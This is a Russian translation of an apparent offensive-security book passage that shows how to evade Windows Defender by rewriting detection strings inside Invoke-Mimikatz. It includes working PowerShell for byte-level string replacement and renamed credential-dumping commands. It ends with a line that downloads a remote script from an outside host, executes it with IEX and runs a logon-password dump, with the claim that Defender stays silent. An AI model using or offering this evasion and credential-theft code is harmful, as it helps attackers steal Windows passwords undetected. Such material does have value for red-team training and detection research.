# Уклоняясь от сопоставления строк

#Если мы сможем изменить некоторые из этих уличающих нас строк внутри Mimikatz перед его загрузкой, мы полностью обойдём Defender. Естественно, мы бы могли изменить данные строки на уровне исходного кода, но тогда нам пришлось бы вручную отслеживать всякий новый выпуск. Гораздо проще подправить эти строки в самом Invoke-Mimikatz. Именно это я и выполнил в своём индивидуальном сценарии.
#Прокрутите его до строки 2555, где начинается вызывающая предупреждение строка и я расскажу вам про этот код.
#Мы начинаем с определения перечня ключевых слов и их новых благополучных альтернатив. Такие строки замещения обязаны иметь ту же самую длину во избежание видоизменение структуры исполняемого файла. Я позаимствовал вызывающих раздражение ключевых слов из проекта Reflect-pe, который применяет ту же самую технику для загрузки произвольного исполняемого файла в память. Его полный список содержит 14 критически важных ключевых слов для замены. В этом примере я покажу лишь два, mimikatz и gentilwiki с безобидной заменой их:


$hash = @{"mimikatz" = "yolokity", "gentilkiwi" = "miniorange"}
 	   
#Далее мы готовим свои кодирующие фильтры для верного форматирования строк в массивы байт. В Windows по умолчанию настроен Unicode, поэтому выглядящая как mimi строка на самом деле хранится как \x00m\x00i\x00m\x00i. Класс [system.Text.Encoding]::Unicode поможет нам преобразовывать обычные строки в массивы байт Unicode.
#Однако, имеется проблема: PowerShell поддерживает только метод поиска соответствия и замены со строками, поэтому нам придётся преобразовывать свои массивы обратно в строки. Последующее усложнение состоит в том, что .NET, совершая ещё один блестящий подвиг, теряет байт \x00 в процессе обычного преобразования строки. Например, Unicode \x00m, к примеру, преобразуется в однобайтовую букву m, что производит сдвигает смещения внутри изменяемого исполняемого файла и искажает его структуру. Поэтому нам требуется применять особую кодировку с названием ISO/28591 {Прим. пер.: точнее, ISO-8859-1, 28591 - применяемый в Windows номер кодовой страницы, используется для кодирования в 8 бит практического большинства алфавитов с латиницей.}, которая сбережёт эти драгоценные байты \x00, что позволит преобразовать строки в байты без усечения. В Листинге 10.3 приведён код для перебора нашего перечня уличающих слов и замены каждого из них новой безобидной версией:
 
#Листинг 10.3. Запутывающий код

  $uni = [system.Text.Encoding]::Unicode
  $Encoder = [System.Text.Encoding]::GetEncoding(28591)
  $binary_text = $Encoder.GetString($PEBytes)
  $hash.Keys | ForEach-Object {
     $old = $Encoder.GetString($uni.GetBytes($_))
     $new = $Encoder.GetString($uni.GetBytes($hash.Item($_)))

      $ binary_text = $ binary_text -replace $old, $new
  }
  # Мы преобразовываем полученный результат обратно в массив байт
  $PEBytes = $Encoder.GetBytes($binary_text)
 	   
# В самых первых двух строках мы готовим кодировщики Unicode и ISO/28591; затем мы загружаем исполняемый файл Mimikatz изначально хранимый в качестве массива байт, PEBytes в строку с названием $binary_text1. Мы обходи в цикле массив ключевых слов для замены2, преобразовываем их в Unicode, затем получаем представляющую их строку при помощи ISO/28591 перед исполнением классической замены строки в PowerShell.
# Будь ты проклят, PowerShell, и твоя бесполезная сложность ... но хорошая новость в том, что это работает. Давайте испробуем.
# Вы заметите, что в сценарии Invoke-mimi.ps1, примерно в строке 2610, мы заменили распространённые команды sekrulsa и logonpasswords на sekelssa и Passlogonwords, поэтому, естественно, нам требуется соблюдать это изменение при вызове нового Invoke-Mimikatz:

$browser = New-Object System.Net.WebClient
$file="https://sf-res.com/Invoke-mimi.ps1"
IEX($browser.DownloadString($file))
Invoke-Mimikatz -command "privilege::debug sekelssa::Passlogonwords"
		
# Когда мы исполним эту новую версию Invoke-Mimikatz, мы не получим ни одной активности от Defender.